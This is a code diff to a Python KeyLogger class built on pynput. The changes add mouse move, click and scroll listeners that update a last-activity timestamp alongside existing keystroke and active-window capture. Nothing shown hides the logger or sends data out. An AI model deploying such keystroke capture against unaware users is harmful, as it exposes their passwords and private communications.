@@ -1,4 +1,4 @@
-from pynput import keyboard
+from pynput import keyboard, mouse
 import time
 import threading
 import subprocess
@@ -22,16 +22,24 @@ class KeyLogger:
         self.is_running = False
         self.lock = threading.Lock()
         self.listener = None
+        self.mouse_listener = None
         self.current_window = "Unknown"
         self.window_thread = None
         self.start_time = None
+        self.last_activity_time = datetime.now()
 
     def _monitor_window(self):
         while self.is_running:
             self.current_window = get_active_window()
             time.sleep(1)
 
+    def update_activity(self, *args):
+        # Optimization: Only update if significant time passed (e.g. 1s) to avoid spam
+        # But for exact accuracy, we can just update. Python handles it fine.
+        self.last_activity_time = datetime.now()
+
     def on_press(self, key):
+        self.update_activity()
         try:
             # Alphanumeric keys
             k = key.char
@@ -63,6 +71,14 @@ class KeyLogger:
         
         self.listener = keyboard.Listener(on_press=self.on_press)
         self.listener.start()
+        
+        self.mouse_listener = mouse.Listener(
+            on_move=self.update_activity,
+            on_click=self.update_activity,
+            on_scroll=self.update_activity
+        )
+        self.mouse_listener.start()
+
         print("Keylogger started.")
 
     def stop(self):
@@ -72,6 +88,8 @@ class KeyLogger:
         self.is_running = False
         if self.listener:
             self.listener.stop()
+        if self.mouse_listener:
+            self.mouse_listener.stop()
         if self.window_thread:
             self.window_thread.join(timeout=1)
         print("Keylogger stopped.")
